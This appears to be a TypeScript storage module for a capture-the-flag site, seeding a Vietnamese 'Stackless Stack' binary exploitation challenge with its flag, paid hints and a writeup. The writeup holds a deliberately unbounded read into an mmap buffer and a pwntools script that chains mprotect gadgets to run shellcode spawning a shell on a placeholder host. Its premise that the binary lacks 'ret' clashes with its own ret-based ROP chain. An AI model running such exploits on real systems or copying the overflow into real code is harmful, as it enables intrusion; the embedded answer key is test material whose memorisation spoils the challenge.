import { 
  type Challenge, 
  type InsertChallenge, 
  type Hint, 
  type InsertHint,
  type Submission,
  type InsertSubmission,
  type WriteupSection,
  type InsertWriteupSection
} from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  getChallenge(id: string): Promise<Challenge | undefined>;
  createChallenge(challenge: InsertChallenge): Promise<Challenge>;
  updateChallengeSolves(id: string, solves: number): Promise<void>;
  
  getHintsByChallenge(challengeId: string): Promise<Hint[]>;
  createHint(hint: InsertHint): Promise<Hint>;
  
  createSubmission(submission: InsertSubmission): Promise<Submission>;
  getSubmissionsByChallenge(challengeId: string): Promise<Submission[]>;
  
  getWriteupSectionsByChallenge(challengeId: string): Promise<WriteupSection[]>;
  createWriteupSection(section: InsertWriteupSection): Promise<WriteupSection>;
  
  getUnlockedHints(sessionId: string, challengeId: string): Promise<string[]>;
  unlockHint(sessionId: string, challengeId: string, hintId: string): Promise<void>;
}

export class MemStorage implements IStorage {
  private challenges: Map<string, Challenge>;
  private hints: Map<string, Hint>;
  private submissions: Map<string, Submission>;
  private writeupSections: Map<string, WriteupSection>;
  private unlockedHints: Map<string, Set<string>>;

  constructor() {
    this.challenges = new Map();
    this.hints = new Map();
    this.submissions = new Map();
    this.writeupSections = new Map();
    this.unlockedHints = new Map();
    
    this.seedData();
  }

  private seedData() {
    const stacklessStackId = "stackless-stack";
    
    const challenge: Challenge = {
      id: stacklessStackId,
      title: "Stackless Stack",
      description: `Binary x86-64 không có stack (dùng mmap + syscall để thay thế).

Lỗi buffer overflow nhưng không có ret.

Bạn cần khai thác lỗ hổng này để lấy flag. Challenge này yêu cầu kiến thức sâu về ROP chain và kỹ thuật exploitation nâng cao.

Điểm đặc biệt: Binary này không sử dụng stack truyền thống, thay vào đó dùng mmap để cấp phát vùng nhớ và syscall để thực thi. Điều này tạo ra một môi trường exploitation hoàn toàn khác biệt so với các binary thông thường.`,
      category: "pwn",
      difficulty: "master hacker",
      points: 500,
      flag: "VNFLAG{HUNG_VUONG_TO_QUOC_GIUP_NHAN_SI_VIETNAM_8R3b1K7p4M9q2L6z0F5yXc}",
      author: "CTF Team",
      solves: 0,
    };
    
    this.challenges.set(stacklessStackId, challenge);
    
    const hints: InsertHint[] = [
      {
        challengeId: stacklessStackId,
        order: 1,
        content: "Bắt đầu bằng việc phân tích binary với các công cụ như radare2, ghidra hoặc IDA. Tìm kiếm các hàm quan trọng và xác định vị trí buffer overflow.",
        pointsCost: 50,
      },
      {
        challengeId: stacklessStackId,
        order: 2,
        content: "Binary không có stack truyền thống, nhưng vẫn có buffer overflow. Hãy tìm các syscall gadget có thể sử dụng để xây dựng ROP chain.",
        pointsCost: 100,
      },
      {
        challengeId: stacklessStackId,
        order: 3,
        content: "Sử dụng mprotect syscall để thay đổi quyền của vùng nhớ thành executable. Đây là chìa khóa để thực thi shellcode trong môi trường stackless.",
        pointsCost: 150,
      },
    ];
    
    hints.forEach(hint => {
      const id = randomUUID();
      this.hints.set(id, { id, ...hint });
    });
    
    const writeupSections: InsertWriteupSection[] = [
      {
        challengeId: stacklessStackId,
        order: 1,
        title: "Reconnaissance - Phân tích Binary",
        content: `Bước đầu tiên trong việc khai thác bất kỳ binary nào là hiểu rõ về cấu trúc và hành vi của nó.

Sử dụng các công cụ sau để phân tích:
- file: Xác định loại file và kiến trúc
- checksec: Kiểm tra các cơ chế bảo vệ (NX, PIE, ASLR, etc.)
- radare2/ghidra/IDA: Disassemble và phân tích code

Kết quả quan trọng:
- Binary là x86-64 ELF
- Không có stack canary
- NX enabled (vùng stack không thực thi được)
- ASLR enabled
- Binary sử dụng mmap thay vì stack truyền thống`,
        codeBlock: `$ file stackless_stack
stackless_stack: ELF 64-bit LSB executable, x86-64

$ checksec stackless_stack
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)`,
        language: "bash",
      },
      {
        challengeId: stacklessStackId,
        order: 2,
        title: "Vulnerability Analysis - Tìm lỗ hổng",
        content: `Sau khi disassemble, chúng ta phát hiện ra một hàm vulnerable đọc input vào buffer được cấp phát bởi mmap.

Đặc điểm của lỗ hổng:
- Buffer overflow trong vùng nhớ mmap
- Không có return address trên stack truyền thống
- Có thể ghi đè lên các con trỏ và data structures quan trọng

Vùng nhớ mmap có quyền RW (read-write) nhưng không executable. Chúng ta cần bypass NX protection.`,
        codeBlock: `void vulnerable_function() {
    char *buffer = mmap(NULL, 0x1000, 
                       PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, 
                       -1, 0);
    
    // Vulnerable read - no bounds checking!
    read(0, buffer, 0x2000);  // Can overflow!
    
    // Some processing...
}`,
        language: "c",
      },
      {
        challengeId: stacklessStackId,
        order: 3,
        title: "ROP Chain Construction",
        content: `Vì không có stack return address, chúng ta cần tìm cách khác để kiểm soát execution flow.

Chiến lược:
1. Tìm các syscall gadgets trong binary
2. Xây dựng ROP chain để gọi mprotect syscall
3. Sử dụng mprotect để thay đổi quyền vùng nhớ thành RWX
4. Nhảy vào shellcode đã được inject

Các gadgets cần thiết:
- pop rdi; ret (argument 1)
- pop rsi; ret (argument 2)
- pop rdx; ret (argument 3)
- pop rax; ret (syscall number)
- syscall; ret`,
        codeBlock: `# ROPgadget --binary stackless_stack
0x00401234 : pop rdi ; ret
0x00401236 : pop rsi ; ret
0x00401238 : pop rdx ; ret
0x0040123a : pop rax ; ret
0x0040123c : syscall ; ret

# mprotect syscall number: 10
# mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC)`,
        language: "python",
      },
      {
        challengeId: stacklessStackId,
        order: 4,
        title: "Exploit Implementation",
        content: `Kết hợp tất cả lại với nhau để tạo exploit hoàn chỉnh.

Các bước thực hiện:
1. Tính toán offset để overflow
2. Inject shellcode vào vùng nhớ mmap
3. Xây dựng ROP chain để gọi mprotect
4. Thay đổi quyền vùng nhớ thành executable
5. Redirect execution đến shellcode

Shellcode có thể là:
- execve("/bin/sh") để có shell
- open/read/write để đọc flag file
- Hoặc bất kỳ payload nào bạn muốn`,
        codeBlock: `from pwn import *

# Connect to challenge
p = remote('ctf.example.com', 1337)

# Build ROP chain for mprotect
rop = ROP('./stackless_stack')
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(0x600000)  # mmap address
rop.raw(rop.find_gadget(['pop rsi', 'ret']))
rop.raw(0x1000)    # size
rop.raw(rop.find_gadget(['pop rdx', 'ret']))
rop.raw(7)         # PROT_READ|WRITE|EXEC
rop.raw(rop.find_gadget(['pop rax', 'ret']))
rop.raw(10)        # mprotect syscall
rop.raw(rop.find_gadget(['syscall', 'ret']))

# Shellcode
shellcode = asm(shellcraft.sh())

# Build payload
payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += rop.chain()

p.send(payload)
p.interactive()`,
        language: "python",
      },
      {
        challengeId: stacklessStackId,
        order: 5,
        title: "Getting the Flag",
        content: `Sau khi exploit thành công, bạn sẽ có quyền thực thi code trong context của binary.

Có nhiều cách để lấy flag:
- Nếu shellcode của bạn spawn shell, chỉ cần cat flag.txt
- Nếu sử dụng open/read/write syscalls, đọc trực tiếp flag file
- Flag có thể nằm trong memory, trong file, hoặc được in ra sau khi exploit thành công

Flag format: VNFLAG{...}

Congratulations nếu bạn đã đến được đây! Đây là một challenge khó đòi hỏi hiểu biết sâu về binary exploitation, ROP, và syscalls.`,
        codeBlock: `$ python exploit.py
[+] Opening connection to ctf.example.com on port 1337
[*] Switching to interactive mode
$ cat flag.txt
VNFLAG{HUNG_VUONG_TO_QUOC_GIUP_NHAN_SI_VIETNAM_8R3b1K7p4M9q2L6z0F5yXc}
$ exit
[*] Closed connection`,
        language: "bash",
      },
    ];
    
    writeupSections.forEach(section => {
      const id = randomUUID();
      this.writeupSections.set(id, { 
        id, 
        ...section,
        codeBlock: section.codeBlock ?? null,
        language: section.language ?? null
      });
    });
  }

  async getChallenge(id: string): Promise<Challenge | undefined> {
    return this.challenges.get(id);
  }

  async createChallenge(insertChallenge: InsertChallenge): Promise<Challenge> {
    const id = randomUUID();
    const challenge: Challenge = { 
      ...insertChallenge, 
      id,
      solves: insertChallenge.solves ?? 0
    };
    this.challenges.set(id, challenge);
    return challenge;
  }

  async updateChallengeSolves(id: string, solves: number): Promise<void> {
    const challenge = this.challenges.get(id);
    if (challenge) {
      challenge.solves = solves;
      this.challenges.set(id, challenge);
    }
  }

  async getHintsByChallenge(challengeId: string): Promise<Hint[]> {
    return Array.from(this.hints.values())
      .filter(hint => hint.challengeId === challengeId)
      .sort((a, b) => a.order - b.order);
  }

  async createHint(insertHint: InsertHint): Promise<Hint> {
    const id = randomUUID();
    const hint: Hint = { id, ...insertHint };
    this.hints.set(id, hint);
    return hint;
  }

  async createSubmission(insertSubmission: InsertSubmission): Promise<Submission> {
    const id = randomUUID();
    const submission: Submission = { 
      id, 
      ...insertSubmission, 
      timestamp: new Date() 
    };
    this.submissions.set(id, submission);
    return submission;
  }

  async getSubmissionsByChallenge(challengeId: string): Promise<Submission[]> {
    return Array.from(this.submissions.values())
      .filter(sub => sub.challengeId === challengeId)
      .sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
  }

  async getWriteupSectionsByChallenge(challengeId: string): Promise<WriteupSection[]> {
    return Array.from(this.writeupSections.values())
      .filter(section => section.challengeId === challengeId)
      .sort((a, b) => a.order - b.order);
  }

  async createWriteupSection(insertSection: InsertWriteupSection): Promise<WriteupSection> {
    const id = randomUUID();
    const section: WriteupSection = { 
      id, 
      ...insertSection,
      codeBlock: insertSection.codeBlock ?? null,
      language: insertSection.language ?? null
    };
    this.writeupSections.set(id, section);
    return section;
  }

  async getUnlockedHints(sessionId: string, challengeId: string): Promise<string[]> {
    const key = `${sessionId}:${challengeId}`;
    const unlocked = this.unlockedHints.get(key);
    return unlocked ? Array.from(unlocked) : [];
  }

  async unlockHint(sessionId: string, challengeId: string, hintId: string): Promise<void> {
    const allHints = await this.getHintsByChallenge(challengeId);
    const hint = allHints.find(h => h.id === hintId);
    
    if (!hint) {
      throw new Error("Hint not found for this challenge");
    }
    
    if (hint.challengeId !== challengeId) {
      throw new Error("Hint does not belong to this challenge");
    }
    
    const key = `${sessionId}:${challengeId}`;
    let unlocked = this.unlockedHints.get(key);
    
    if (!unlocked) {
      unlocked = new Set();
      this.unlockedHints.set(key, unlocked);
    }
    
    unlocked.add(hintId);
  }
}

export const storage = new MemStorage();
